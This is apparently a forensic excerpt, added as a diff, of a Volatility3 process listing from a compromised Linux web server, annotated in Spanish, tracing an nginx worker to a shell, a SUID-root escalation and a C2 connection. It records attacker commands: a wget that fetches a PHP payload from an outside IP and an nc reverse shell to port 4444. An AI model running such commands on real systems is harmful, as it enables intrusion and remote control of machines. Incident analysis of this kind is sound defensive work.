@@ -1,0 +1,9 @@
+# volatility3 linux.pslist  (extracto)   captura: 2026-09-05 02:30 UTC
+PID   PPID  USER      COMM
+1     0     root      systemd
+812   1     root      nginx
+842   812   www-data  nginx: worker
+1201  812   www-data  sh -c wget http://45.13.37.7/s.php
+1240  1201  www-data  bash            <- shell interactiva del atacante
+1477  1240  root      system-check    <- SUID root (escalada); euid=0
+1490  1477  root      nc 45.13.37.7 4444   <- reverse shell / C2
